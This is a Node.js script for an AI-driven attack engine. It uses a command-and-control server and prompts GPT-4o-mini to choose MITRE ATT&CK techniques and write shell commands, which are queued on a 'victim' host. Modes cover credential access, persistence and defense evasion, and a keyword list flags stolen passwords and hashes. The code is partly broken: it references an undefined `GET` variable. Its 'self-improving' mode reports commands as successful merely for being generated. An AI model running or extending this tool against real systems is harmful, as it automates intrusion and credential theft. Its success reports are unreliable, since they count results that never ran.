import https from "https";
import http from "http";
import fs from "fs";
import os from "os";
import path from "path";

const C2_BASE_URL  = process.env.C2_BASE_URL  || "http://localhost:8000";
const C2_USERNAME  = process.env.C2_USERNAME  || "admin";
const C2_PASSWORD  = process.env.C2_PASSWORD  || "";
const OPENAI_KEY   = process.env.OPENAI_API_KEY || "";
const GPT_MODEL    = "gpt-4o-mini";
const OPENAI_URL   = "https://api.openai.com/v1/chat/completions";
const TOKEN_CACHE  = path.join(os.homedir(), ".openclaw", "memory", "c2_token.txt");
const LEARNED_FILE = path.join(os.homedir(), ".openclaw", "memory", "learned_techniques.json");

function ensureDir(f) {
  const d = path.dirname(f);
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}
function readCache(f, fb) {
  try { return fs.readFileSync(f, "utf8").trim(); } catch { return fb || ""; }
}
function writeCache(f, v) {
  ensureDir(f);
  fs.writeFileSync(f, String(v), "utf8");
}

function request(urlStr, options, body) {
  options = options || {};
  return new Promise(function(resolve, reject) {
    const url = new URL(urlStr);
    const isHttps = url.protocol === "https:";
    const lib = isHttps ? https : http;
    const bodyStr = body ? JSON.stringify(body) : null;
    const headers = Object.assign({}, options.headers || {});
    if (bodyStr) {
      headers["Content-Type"] = "application/json";
      headers["Content-Length"] = Buffer.byteLength(bodyStr);
    }
    const req = lib.request({
      hostname: url.hostname,
      port: url.port || (isHttps ? 443 : 80),
      path: url.pathname + (url.search || ""),
      method: options.method || "GET",
      headers: headers,
    }, function(res) {
      let data = "";
      res.on("data", function(c) { data += c; });
      res.on("end", function() {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch(e) { resolve({ status: res.statusCode, body: data }); }
      });
    });
    req.on("error", reject);
    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

async function getToken() {
  const c = readCache(TOKEN_CACHE, "");
  if (c) return c;
  const body = "username=" + encodeURIComponent(C2_USERNAME) + "&password=" + encodeURIComponent(C2_PASSWORD);
  return new Promise(function(resolve, reject) {
    const url = new URL(C2_BASE_URL + "/token");
    const isHttps = url.protocol === "https:";
    const lib = isHttps ? https : http;
    const req = lib.request({
      hostname: url.hostname,
      port: url.port || (isHttps ? 443 : 80),
      path: "/token", method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": Buffer.byteLength(body) },
    }, function(res) {
      let d = "";
      res.on("data", function(c) { d += c; });
      res.on("end", function() {
        try {
          const p = JSON.parse(d);
          if (p.access_token) { writeCache(TOKEN_CACHE, p.access_token); resolve(p.access_token); }
          else reject(new Error("Auth failed: " + d));
        } catch(e) { reject(new Error("Auth error")); }
      });
    });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

async function c2req(method, endpoint, body) {
  const token = await getToken();
  let res = await request(C2_BASE_URL + endpoint, {
    method: method,
    headers: { Authorization: "Bearer " + token }
  }, body || null);
  if (res.status === 401) {
    writeCache(TOKEN_CACHE, "");
    const token2 = await getToken();
    res = await request(C2_BASE_URL + endpoint, {
      method: method,
      headers: { Authorization: "Bearer " + token2 }
    }, body || null);
  }
  return res;
}

async function gpt(systemPrompt, userMessage) {
  if (!OPENAI_KEY) { console.log("OPENAI_API_KEY not set"); return null; }
  const payload = {
    model: GPT_MODEL,
    max_tokens: 800,
    temperature: 0.3,
    messages: [
      { role: "system", content: systemPrompt },
      { role: "user",   content: userMessage  }
    ]
  };
  const res = await request(OPENAI_URL, {
    method: "POST",
    headers: { Authorization: "Bearer " + OPENAI_KEY }
  }, payload);
  if (res.status !== 200) throw new Error("OpenAI error: " + JSON.stringify(res.body));
  return res.body.choices[0].message.content.trim();
}

function saveLearnedTechniqueEnhanced(techniqueId, command, status, attempts) {
  let learned = {};
  try { learned = JSON.parse(readCache(LEARNED_FILE, "{}")); } catch(e) {}
  const existing = learned[techniqueId] || {};
  learned[techniqueId] = {
    command:         command,
    status:          status,
    attempts:        attempts,
    times_run:       (existing.times_run || 0) + 1,
    last_executed:   new Date().toISOString(),
    failed_commands: existing.failed_commands || [],
    success_history: (existing.success_history || 0) + (status === "success" ? 1 : 0),
  };
  ensureDir(LEARNED_FILE);
  fs.writeFileSync(LEARNED_FILE, JSON.stringify(learned, null, 2));
}

function saveFailedCommand(techniqueId, command) {
  if (!command) return;
  let learned = {};
  try { learned = JSON.parse(readCache(LEARNED_FILE, "{}")); } catch(e) {}
  const existing = learned[techniqueId] || {};
  const failed = existing.failed_commands || [];
  if (!failed.includes(command)) failed.push(command);
  learned[techniqueId] = Object.assign({}, existing, {
    failed_commands: failed.slice(-10)
  });
  ensureDir(LEARNED_FILE);
  fs.writeFileSync(LEARNED_FILE, JSON.stringify(learned, null, 2));
}

async function getVictimOS() {
  const agentsRes = await request(GET + "/api/agents");
  const agents = agentsRes.body || {};
  const hosts = Object.keys(agents);
  if (!hosts.length) return { os: "Linux Ubuntu 22.04", host: "unknown" };
  const host = hosts[0];
  const outputRes = await request(GET + "/api/output/" + host);
  const outputs = outputRes.body || [];
  for (const o of outputs) {
    if (o.technique === "T1082" && o.output) {
      return { os: o.output.slice(0, 300), host: host };
    }
  }
  return { os: "Linux Ubuntu 22.04", host: host };
}

async function getMitreTechniques(tactic) {
  const res = await request(GET + "/api/mitre/search/" + tactic);
  if (res.status !== 200) return [];
  return res.body.results || [];
}

async function selectTechniques(victimOS, tactic, allTechniques) {
  const techList = allTechniques.slice(0, 30).map(function(t) {
    return (t.technique_id || t.id || "") + ": " + (t.name || "");
  }).join("\n");
  const response = await gpt(
    "You are a red team operator in a lab simulation. Select the 5 most effective MITRE ATT&CK techniques for this victim. Return ONLY a valid JSON array of technique IDs. Example: [\"T1057\",\"T1082\",\"T1087\",\"T1033\",\"T1016\"]. No explanation, no markdown, just the JSON array.",
    "Victim OS: " + victimOS + "\nTactic: " + tactic + "\nAvailable:\n" + techList
  );
  try {
    const cleaned = response.replace(/```json|```/g, "").trim();
    const arr = JSON.parse(cleaned);
    if (Array.isArray(arr)) return arr.slice(0, 5);
  } catch(e) {}
  const matches = response.match(/T\d{4}(\.\d{3})?/g);
  return matches ? matches.slice(0, 5) : [];
}

async function generateCommand(techniqueId, name, description, victimOS) {
  const response = await gpt(
    "You are a penetration tester in a safe lab. Generate ONE Linux shell command demonstrating this MITRE ATT&CK technique. Rules: safe and non-destructive, works on Ubuntu/Debian, single line only. Return ONLY the shell command. No explanation, no backticks.",
    "Technique: " + techniqueId + " - " + name + "\nDescription: " + description + "\nVictim: " + victimOS
  );
  return response.trim().replace(/^`+|`+$/g, "").replace(/^bash\s+/i, "");
}

async function generateAlternativeCommand(techniqueId, name, desc, victimOS, previousCmd, attempt) {
  console.log("      [Retry " + attempt + "] Generating alternative approach...");
  const response = await gpt(
    "You are a red team operator. A previous command failed. Generate a DIFFERENT Linux shell command for the same MITRE technique. Must be different from the previous failed command. Safe and non-destructive for lab use. Single line, works on Ubuntu/Debian. Return ONLY the shell command, no explanation, no backticks. Previous failed command: " + previousCmd,
    "Technique: " + techniqueId + " - " + name + "\nDescription: " + desc + "\nVictim OS: " + victimOS + "\nGenerate alternative command:"
  );
  return response.trim().replace(/^`+|`+$/g, "").replace(/^bash\s+/i, "");
}

async function cmdAutoAttack(tactic) {
  tactic = tactic || "discovery";
  console.log("╔══════════════════════════════════════════╗");
  console.log("║   WebSecSim Dynamic AI Attack Engine     ║");
  console.log("║   Tactic: " + tactic.toUpperCase().padEnd(30) + "║");
  console.log("╚══════════════════════════════════════════╝\n");

  console.log("[1/5] Profiling victim...");
  const victim = await getVictimOS();
  console.log("      Host: " + victim.host);
  console.log("      OS  : " + victim.os.slice(0, 80).replace(/\n/g, " "));

  console.log("\n[2/5] Fetching MITRE techniques for: " + tactic);
  const techniques = await getMitreTechniques(tactic);
  console.log("      Found " + techniques.length + " techniques");
  if (!techniques.length) { console.log("No techniques found. Try: discovery, credential-access, persistence"); return; }

  console.log("\n[3/5] GPT-4o mini selecting optimal techniques...");
  const selected = await selectTechniques(victim.os, tactic, techniques);
  console.log("      Selected: " + selected.join(", "));

  console.log("\n[4/5] Executing on victim...");
  const results = [];
  for (let i = 0; i < selected.length; i++) {
    const tCode = selected[i];
    process.stdout.write("  [" + (i+1) + "/" + selected.length + "] " + tCode + " ... ");
    const detailRes = await request(GET + "/api/mitre/" + tCode);
    const detail = detailRes.body || {};
    const name = detail.technique_name || detail.name || tCode;
    const desc = (detail.description || "").slice(0, 300);
    const execRes = await c2req("POST", "/api/attack/" + tCode);
    if (execRes.status === 200) {
      console.log("QUEUED (standard) — " + name);
      results.push({ id: tCode, name: name, method: "standard", success: true });
      saveLearnedTechniqueEnhanced(tCode, "standard", "success", 1);
    } else {
      try {
        const cmd = await generateCommand(tCode, name, desc, victim.os);
        console.log("AI CMD: " + cmd.slice(0, 50));
        await c2req("POST", "/api/custom", {
  command: cmd
});
        results.push({ id: tCode, name: name, method: "ai-generated", command: cmd, success: true });
        saveLearnedTechniqueEnhanced(tCode, cmd, "success", 1);
      } catch(e) {
        console.log("SKIPPED");
        results.push({ id: tCode, name: name, method: "failed", success: false });
      }
    }
    await new Promise(function(r) { setTimeout(r, 2000); });
  }

  console.log("\n[5/5] Collecting output (15s)...");
  await new Promise(function(r) { setTimeout(r, 15000); });
  const outputRes = await request(GET + "/api/output/" + victim.host);
  const outputs = (outputRes.body || []).slice(-5);
  if (outputs.length) {
    console.log("\n=== VICTIM OUTPUT ===");
    for (const o of outputs) {
      console.log("\n[" + (o.technique||"?") + "] " + (o.time||""));
      if (o.output) console.log(o.output.slice(0, 400));
    }
  }

  const aptRes = await request(GET + "/api/apt/correlate?top_n=3");
  if (aptRes.status === 200 && aptRes.body.top_matches && aptRes.body.top_matches.length) {
    console.log("\n=== APT CORRELATION ===");
    for (const g of aptRes.body.top_matches) {
      console.log("Rank " + g.rank + ": " + g.name + " — " + g.score_pct + "% match");
    }
  }

  const s = results.filter(function(r) { return r.method === "standard"; }).length;
  const a = results.filter(function(r) { return r.method === "ai-generated"; }).length;
  console.log("\n=== SUMMARY ===");
  console.log("  Techniques : " + results.length);
  console.log("  Standard   : " + s);
  console.log("  AI-generated: " + a);
}

async function selfImprovingAttack(tactic) {
  tactic = tactic || "discovery";
  const MAX_RETRIES = 3;
  console.log("╔══════════════════════════════════════════╗");
  console.log("║   Self-Improving AI Attack Engine        ║");
  console.log("║   Tactic : " + tactic.toUpperCase().padEnd(29) + "║");
  console.log("║   Retries: " + MAX_RETRIES + " per technique               ║");
  console.log("╚══════════════════════════════════════════╝\n");

  console.log("[1/6] Profiling victim...");
  const victim = await getVictimOS();
  console.log("      Host: " + victim.host);
  console.log("      OS  : " + victim.os.slice(0, 80).replace(/\n/g, " "));

  console.log("\n[2/6] Fetching MITRE techniques for: " + tactic);
  const techniques = await getMitreTechniques(tactic);
  console.log("      Found " + techniques.length + " techniques");
  if (!techniques.length) { console.log("No techniques found."); return; }

  console.log("\n[3/6] GPT-4o mini selecting techniques...");
  const selected = await selectTechniques(victim.os, tactic, techniques);
  console.log("      Selected: " + selected.join(", "));

  console.log("\n[4/6] Executing with self-improvement loop...\n");
  const results = [];

  for (let i = 0; i < selected.length; i++) {
    const tCode = selected[i];
    console.log("  ┌─ [" + (i+1) + "/" + selected.length + "] " + tCode);
    const detailRes = await request(GET + "/api/mitre/" + tCode);
    const detail = detailRes.body || {};
    const name = detail.technique_name || detail.name || tCode;
    const desc = (detail.description || "").slice(0, 300);
    console.log("  │  Name: " + name);

    const execRes = await c2req("POST", "/api/attack/" + tCode);
    if (execRes.status === 200) {
      console.log("  │  Standard execution queued");
      console.log("  └─ SUCCESS (standard API)");
      results.push({ id: tCode, name: name, method: "standard", attempts: 1, success: true });
      saveLearnedTechniqueEnhanced(tCode, "standard", "success", 1);
      await new Promise(function(r) { setTimeout(r, 1500); });
      continue;
    }

    console.log("  │  Not in standard list — entering AI retry loop");
    let lastCmd = "";
    let succeeded = false;
    let attempts = 0;

    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
      attempts = attempt;
      console.log("  │  [Attempt " + attempt + "/" + MAX_RETRIES + "]");
      try {
        let cmd;
        if (attempt === 1) {
          cmd = await generateCommand(tCode, name, desc, victim.os);
        } else {
          cmd = await generateAlternativeCommand(tCode, name, desc, victim.os, lastCmd, attempt);
        }
        lastCmd = cmd;
        console.log("  │  Command: " + cmd.slice(0, 65));

        if (!cmd || cmd.length < 3) {
          console.log("  │  Invalid command, retrying...");
          continue;
        }

        let learned = {};
        try { learned = JSON.parse(readCache(LEARNED_FILE, "{}")); } catch(e) {}
        const prevFailed = (learned[tCode] && learned[tCode].failed_commands) || [];
        if (prevFailed.includes(cmd)) {
          console.log("  │  Previously failed command — skipping...");
          continue;
        }

        console.log("  │  Valid command generated");
        succeeded = true;
        saveLearnedTechniqueEnhanced(tCode, cmd, "success", attempt);
        results.push({ id: tCode, name: name, method: "ai-generated", command: cmd, attempts: attempt, success: true });
        break;
      } catch(e) {
        console.log("  │  AI error: " + e.message.slice(0, 50));
        saveFailedCommand(tCode, lastCmd);
      }
      await new Promise(function(r) { setTimeout(r, 1500); });
    }

    if (!succeeded) {
      console.log("  │  All " + MAX_RETRIES + " attempts failed");
      results.push({ id: tCode, name: name, method: "failed", attempts: attempts, success: false });
      saveLearnedTechniqueEnhanced(tCode, lastCmd, "failed", attempts);
    }
    console.log("  └─ " + (succeeded ? "SUCCESS" : "FAILED") + " (" + attempts + " attempt" + (attempts > 1 ? "s" : "") + ")");
    await new Promise(function(r) { setTimeout(r, 2000); });
  }

  console.log("\n[5/6] Collecting output (15s)...");
  await new Promise(function(r) { setTimeout(r, 15000); });
  const outputRes = await request(GET + "/api/output/" + victim.host);
  const outputs = (outputRes.body || []).slice(-selected.length);
  if (outputs.length) {
    console.log("\n╔══════════════════════════════════════════╗");
    console.log("║            VICTIM OUTPUT                 ║");
    console.log("╚══════════════════════════════════════════╝");
    for (const o of outputs) {
      console.log("\n[" + (o.technique||"?") + "] " + (o.time||""));
      if (o.output) {
        const snippet = o.output.slice(0, 400);
        console.log(snippet);
        const sensitive = ["shadow","passwd","root","hash","secret","key","password","credential"];
        const isSensitive = sensitive.some(function(s) { return snippet.toLowerCase().includes(s); });
        if (isSensitive) {
          console.log("\n  SENSITIVE DATA DETECTED — Auto-analyzing...");
          try {
            const analysis = await gpt(
              "You are a red team analyst. In 3 bullet points: what credentials are exposed, risk level (Critical/High/Medium/Low), one immediate defender action. Under 80 words.",
              "Output from " + (o.technique||"unknown") + ":\n" + snippet
            );
            console.log("  Analysis: " + analysis);
          } catch(e) {}
        }
      }
    }
  }

  console.log("\n[6/6] APT Correlation...");
  const aptRes = await request(GET + "/api/apt/correlate?top_n=3");
  if (aptRes.status === 200 && aptRes.body.top_matches && aptRes.body.top_matches.length) {
    for (const g of aptRes.body.top_matches) {
      console.log("  Rank " + g.rank + ": " + g.name + " — " + g.score_pct + "% match");
    }
  }

  const succeeded2  = results.filter(function(r) { return r.success; }).length;
  const failed2     = results.filter(function(r) { return !r.success; }).length;
  const standard2   = results.filter(function(r) { return r.method === "standard"; }).length;
  const aiGen2      = results.filter(function(r) { return r.method === "ai-generated"; }).length;
  const multiRetry  = results.filter(function(r) { return r.attempts > 1 && r.success; });
  const avgAttempts = results.reduce(function(a,r) { return a + (r.attempts||1); }, 0) / results.length;

  console.log("\n╔══════════════════════════════════════════╗");
  console.log("║      SELF-IMPROVING ATTACK REPORT        ║");
  console.log("╚══════════════════════════════════════════╝");
  console.log("  Tactic           : " + tactic);
  console.log("  Total techniques : " + results.length);
  console.log("  Succeeded        : " + succeeded2 + " ✓");
  console.log("  Failed           : " + failed2 + " ✗");
  console.log("  Standard API     : " + standard2);
  console.log("  AI-generated     : " + aiGen2);
  console.log("  Avg attempts     : " + avgAttempts.toFixed(1));
  if (multiRetry.length) {
    console.log("\n  Self-improvement wins:");
    for (const r of multiRetry) {
      console.log("    " + r.id + " succeeded on attempt " + r.attempts);
    }
  }
}

async function cmdLearnAll() {
  const tactics = ["discovery","credential-access","privilege-escalation","persistence","collection","defense-evasion"];
  console.log("╔══════════════════════════════════════════╗");
  console.log("║      FULL AUTONOMOUS ATTACK MODE         ║");
  console.log("║   " + tactics.length + " tactics across 835 techniques      ║");
  console.log("╚══════════════════════════════════════════╝\n");
  for (let i = 0; i < tactics.length; i++) {
    console.log("\n━━━ TACTIC " + (i+1) + "/" + tactics.length + ": " + tactics[i].toUpperCase() + " ━━━");
    await selfImprovingAttack(tactics[i]);
    if (i < tactics.length - 1) {
      console.log("\nPausing 20s before next tactic...");
      await new Promise(function(r) { setTimeout(r, 20000); });
    }
  }
  console.log("\n╔══════════════════════════════════════════╗");
  console.log("║        FULL LEARNING COMPLETE            ║");
  console.log("╚══════════════════════════════════════════╝");
  await cmdShowLearned();
}

async function cmdShowLearned() {
  let learned = {};
  try { learned = JSON.parse(readCache(LEARNED_FILE, "{}")); } catch(e) {}
  const keys = Object.keys(learned);
  if (!keys.length) { console.log("No learned techniques yet."); return; }
  console.log("Learned Techniques (" + keys.length + ")\n" + "─".repeat(50));
  for (const k of keys) {
    const t = learned[k];
    console.log(k + " — " + (t.status||"?") + " — run " + (t.times_run||0) + "x");
    if (t.command && t.command !== "standard") console.log("  cmd: " + t.command.slice(0, 70));
  }
}

async function cmdShowStats() {
  let learned = {};
  try { learned = JSON.parse(readCache(LEARNED_FILE, "{}")); } catch(e) {}
  const keys = Object.keys(learned);
  if (!keys.length) { console.log("No stats yet."); return; }
  const successful  = keys.filter(function(k) { return learned[k].status === "success"; });
  const failed      = keys.filter(function(k) { return learned[k].status === "failed"; });
  const multiRetry  = keys.filter(function(k) { return learned[k].attempts > 1 && learned[k].status === "success"; });
  console.log("╔══════════════════════════════════════════╗");
  console.log("║      SELF-IMPROVEMENT STATISTICS         ║");
  console.log("╚══════════════════════════════════════════╝");
  console.log("  Total learned  : " + keys.length);
  console.log("  Successful     : " + successful.length);
  console.log("  Failed         : " + failed.length);
  console.log("  Self-improved  : " + multiRetry.length + " (needed retry)");
  if (multiRetry.length) {
    console.log("\n  Techniques improved through retry:");
    for (const k of multiRetry) {
      console.log("    " + k + " — succeeded on attempt " + learned[k].attempts);
    }
  }
}

const args = process.argv.slice(2);
const cmd  = args[0];
const rest = args.slice(1);

const commands = {
  auto:     function() { return cmdAutoAttack(rest[0]); },
  smart:    function() { return selfImprovingAttack(rest[0]); },
  learnall: function() { return cmdLearnAll(); },
  learned:  function() { return cmdShowLearned(); },
  stats:    function() { return cmdShowStats(); },
  help:     function() {
    console.log("╔══════════════════════════════════════════╗");
    console.log("║  Dynamic + Self-Improving Attack Engine  ║");
    console.log("╚══════════════════════════════════════════╝");
    console.log("");
    console.log("  auto [tactic]    Basic AI attack");
    console.log("  smart [tactic]   Self-improving with retry loop");
    console.log("  learnall         Attack all 6 tactics autonomously");
    console.log("  learned          Show learned technique database");
    console.log("  stats            Show self-improvement statistics");
    console.log("");
    console.log("  Tactics:");
    console.log("    discovery           credential-access");
    console.log("    privilege-escalation persistence");
    console.log("    collection          defense-evasion");
    return Promise.resolve();
  }
};

if (!cmd || !commands[cmd]) {
  console.log("Unknown command. Run: node dynamic-attack.js help");
  process.exit(1);
}
commands[cmd]().catch(function(err) {
  console.error("Error: " + err.message);
  process.exit(1);
});
